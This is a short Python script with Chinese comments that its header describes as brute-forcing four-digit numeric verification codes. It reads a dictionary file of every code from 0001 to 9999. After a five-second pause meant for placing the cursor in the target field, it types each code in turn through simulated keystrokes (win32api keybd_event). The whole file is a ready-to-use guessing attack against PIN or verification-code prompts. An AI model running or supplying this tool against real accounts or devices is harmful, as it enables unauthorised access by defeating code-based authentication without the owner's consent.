#-*- coding：utf-8 -*-
#暴力破解四位纯数字验证码，为保证破解质量，破解时间控制在0-5000 second

__author__ = "SWUN_ChenYang"

""" 2018/7/14 21:10"""

import win32api as a
import win32con as b
import time

    #创建验证码字典
    #fp = open("dic.txt","w")
    #for i in range(1,10000):
    #    fp.write("%04d\n"%i)
    #fp.close()


#键值表
dic = {"0" : 48,      
      "1" : 49,      
      "2" : 50,    
      "3" : 51,     
      "4" : 52, 
      "5" : 53,  
      "6" : 54,
      "7" : 55,
      "8" : 56,
      "9" : 57

        }

fp = open("dic.txt","r")  #打开验证码字典


time.sleep(5)   #准备时间 5秒，运行后利用此段时间将光标移动到目标

for i in fp:
    
    

           
       
    a.keybd_event(dic[i[0]],0,0,0) #按键点击
    time.sleep(0.05)                    #延时，防止无效输入
    a.keybd_event(dic[i[0]],0,b.KEYEVENTF_KEYUP,0) #释放按键
    
    a.keybd_event(dic[i[1]],0,0,0)
    time.sleep(0.05)
    a.keybd_event(dic[i[1]],0,b.KEYEVENTF_KEYUP,0)
    
    a.keybd_event(dic[i[2]],0,0,0)
    time.sleep(0.05)
    a.keybd_event(dic[i[2]],0,b.KEYEVENTF_KEYUP,0)
     
    a.keybd_event(dic[i[3]],0,0,0)
    time.sleep(0.05)
    a.keybd_event(dic[i[3]],0,b.KEYEVENTF_KEYUP,0)
    time.sleep(0.2)
    
    print(i) #显示当前测试码
    
            
    

fp.close()        

